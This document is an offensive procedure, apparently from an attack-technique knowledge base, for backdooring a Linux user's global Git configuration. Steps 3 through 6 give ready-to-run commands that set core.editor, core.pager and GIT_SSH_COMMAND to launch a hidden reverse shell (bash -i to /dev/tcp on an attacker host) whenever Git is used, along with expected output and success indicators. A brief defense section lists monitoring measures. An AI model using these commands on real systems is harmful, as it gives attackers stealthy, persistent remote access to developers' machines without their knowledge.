---
type: procedure
description: >-
  Modify Git user configurations to establish persistence by injecting backdoor
  commands that execute when Git operations trigger the editor or pager.
verified: true
submitted: false
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
tactics:
  - '[[tactics/Defense Evasion|TA0005]]'
  - '[[tactics/Execution|TA0002]]'
  - '[[tactics/Persistence|TA0003]]'
  - '[[tactics/Privilege Escalation|TA0004]]'
techniques:
  - '[[techniques/Hijack Execution Flow|T1574]]'
  - '[[techniques/Modify Registry|T1112]]'
  - '[[techniques/Scripting|T1064]]'
sub_techniques: []
tags:
  - backdooring-git
  - git-configs
  - linux-persistence
commands:
  - '[[commands/git-config-view-global]]'
  - '[[commands/git-config-set-core-editor]]'
  - '[[commands/git-config-set-core-pager]]'
  - '[[commands/export-git-editor]]'
  - '[[commands/export-git-ssh-command]]'
  - '[[commands/configure-git-ssh-variant]]'
  - '[[commands/git-config-verify-editor]]'
platforms:
  - Linux
tools: []
validated: true
---

# Backdoor-Git-User-Configurations-for-Persistence

## Summary

This procedure establishes persistence on a Linux system by modifying the user's global Git configuration file (~/.gitconfig) to inject backdoor commands. By altering settings like core.editor or core.pager, arbitrary code (e.g., a reverse shell) executes whenever Git invokes the editor for commit messages or the pager for output display. This technique leverages legitimate Git usage for stealthy persistence, suitable for post-exploitation scenarios where the user frequently interacts with Git repositories.

## Description

Git stores user-level configurations in ~/.gitconfig, which applies to all repositories for the user. Attackers with initial shell access can edit this file to prepend malicious commands to editor or pager invocations. For example, setting core.editor to 'nohup BACKDOOR_COMMAND >/dev/null 2>&1 & vim' ensures the backdoor runs silently in the background before launching the real editor. Similarly, core.pager can be abused for commands producing output, like 'git log'. This method is evasive as it doesn't create new files or services and only triggers during normal Git activity. It requires write access to the user's home directory and assumes Git is installed and used by the target. Potential outcomes include command execution, reverse shell establishment, or data exfiltration upon Git usage. This aligns with hijacking execution flow in user applications for persistence.

## Requirements

1. Shell access to the target Linux system as the user whose Git config will be modified.
2. Git installed on the target (verify with 'which git').
3. Write permissions to ~/.gitconfig (typically user-owned).
4. Defined backdoor command (e.g., reverse shell payload like 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1').
5. Optional: SSH for remote backdoor variants.

## Defense

- Monitor ~/.gitconfig for unauthorized modifications using file integrity monitoring tools like OSSEC or auditd.
- Restrict shell access and enforce least privilege; use containerization to isolate Git usage.
- Enable Git hooks auditing and log editor/pager invocations via process monitoring (e.g., Sysdig).
- Scan for anomalous nohup processes or unexpected network connections triggered by Git.
- Educate users on reviewing .gitconfig and use signed commits to detect tampering.

## Objectives

1. Inject backdoor into Git configurations for persistent code execution on Git usage.
2. Maintain stealthy access without detectable artifacts like new binaries.
3. Enable remote access via SSH backdoors if Git involves remote operations.
4. Ensure backdoor survives reboots and user logins as .gitconfig is user-persistent.

## Instructions

### Step 1: Verify Current Git Configuration

**Context**: Inspect the existing global Git config to understand current settings and avoid overwriting legitimate values. This helps identify if editor or pager is already set and plan the injection accordingly.

**Command** ([[commands/git-config-view-global]]):
```bash
git config --global --list
```

> This lists all global Git settings. Look for core.editor and core.pager entries. If unset, they default to system values like vi or less.

**Expected Output**:
```
user.name=John Doe
user.email=johndoe@example.com
core.editor=vim
core.pager=less
```

### Step 2: Define Backdoor Command

**Context**: Prepare the malicious payload to execute. Replace BACKDOOR with a specific command, such as a reverse shell. Use nohup for detachment and >/dev/null to suppress output.

**Code** ([[codes/Git-Config-Editor-Backdoor]]):

> Embed the backdoor in the editor setting. This code snippet is the configuration line to add to ~/.gitconfig.

**Expected Output**: No immediate output; the backdoor activates on next Git edit operation.

### Step 3: Set Core Editor to Backdoor

**Context**: Modify core.editor to run the backdoor before the legitimate editor. This triggers during 'git commit' or 'git rebase -i', common Git actions.

**Command** ([[commands/git-config-set-core-editor]]):
```bash
git config --global core.editor 'nohup bash -c "bash -i >& /dev/tcp/$_ATTACKER_IP/$_BACKDOOR_PORT 0>&1" >/dev/null 2>&1 & vim'
```

> Substitutes the editor command to prepend the backdoor. Use 'vim' or the target's default editor as the fallback. The backdoor connects to your listener.

**Expected Output**: No output on success; verify with Step 1 command.

### Step 4: Set Core Pager to Backdoor (Alternative)

**Context**: If editor abuse is risky (e.g., no commits expected), use core.pager for output-heavy commands like 'git log' or 'git diff'. This executes on any paged Git output.

**Command** ([[commands/git-config-set-core-pager]]):
```bash
git config --global core.pager 'nohup bash -c "bash -i >& /dev/tcp/$_ATTACKER_IP/$_BACKDOOR_PORT 0>&1" >/dev/null 2>&1 & less -F -X'
```

> Prepends backdoor to the pager (less). Triggers on 'git log' etc., providing persistence via read operations.

**Expected Output**: Silent success; test by running 'git log' and checking for shell connection on your listener.

### Step 5: Configure SSH Backdoor for Remote Git Ops

**Context**: For Git over SSH (e.g., push/pull), set GIT_SSH_COMMAND to inject backdoor on connections. This establishes persistence during remote repository interactions.

**Command** ([[commands/export-git-ssh-command]]):
```bash
export GIT_SSH_COMMAND="nohup bash -c \"bash -i >& /dev/tcp/$_ATTACKER_IP/$_BACKDOOR_PORT 0>&1\" >/dev/null 2>&1 & ssh -i /path/to/key"
```

> Sets environment for SSH invocations by Git. Persists if added to ~/.bashrc or run in session.

Then set variant:

**Command** ([[commands/configure-git-ssh-variant]]):
```bash
git config --global core.sshCommand 'ssh'
git config --global ssh.variant ssh
```

> Ensures standard SSH usage with injected command.

**Expected Output**: Environment variable set; test with 'git fetch' to remote and monitor connection.

### Step 6: Verify Backdoor Configuration

**Context**: Confirm modifications took effect without errors. Trigger a Git operation to test execution.

**Command** ([[commands/git-config-verify-editor]]):
```bash
git config --global core.editor
git config --global core.pager
```

> Should show the injected commands.

Test by running 'git commit --amend' (in a repo) or 'git log'; check listener for incoming shell.

**Expected Output**:
```
nohup bash -c "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" >/dev/null 2>&1 & vim
```

**Success Indicators**:
- Config shows backdoor injection.
- No syntax errors on 'git config --list'.
- Shell connects on Git trigger.
